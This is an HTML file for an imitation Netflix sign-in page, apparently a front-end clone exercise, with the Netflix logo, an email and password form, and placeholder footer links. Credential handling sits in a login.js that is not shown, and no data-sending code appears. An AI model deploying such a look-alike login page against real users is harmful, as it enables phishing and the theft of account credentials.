<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <link rel="shortcut icon" href="images/icons8-netflix-24.png"/>
    <title>Netflix Login</title>
</head>

<body>
    <div id="error-message" class="error-message"></div>
    <div id="nav" class="nav">
        <img class="nav__logo" src="images/netflix-logo-png-2562.png" alt="logo" />
        </div>
    <div class="background-container">
    <div class="login-container">
        <div class="login-box">
            <img class="netflix-logo" src="images/netflix-logo-png-2562.png" alt="Netflix Logo">
            <h2>Sign In</h2>
            <form id="login-form">
                <input type="text" id="username" placeholder="Email or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Sign In</button>
            </form>
            <a href="#">Forgot Password?</a>
            <div class="separator"></div>
            <p>New to Netflix? <a href="#">Sign up now</a>.</p>
        </div>
        </div>
        </div>
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">Questions? Call 1-800-123-4567</a>
                <a href="#">FAQ</a>
                <a href="#">Terms of Use</a>
                <a href="#">Cookies Preferences</a>
                <a href="#">Privacy</a>
                <a href="#">Help Center</a>
                <a href="#">Corporate Information</a>
            </div>
            <div class="language-change">
                <select>
                    <option value="en">English</option>
                    <option value="es">Español</option>
                    <option value="fr">Français</option>
                </select>
            </div>
        </div>
    </footer>
    <script src="login.js"></script>
</body>
</html>
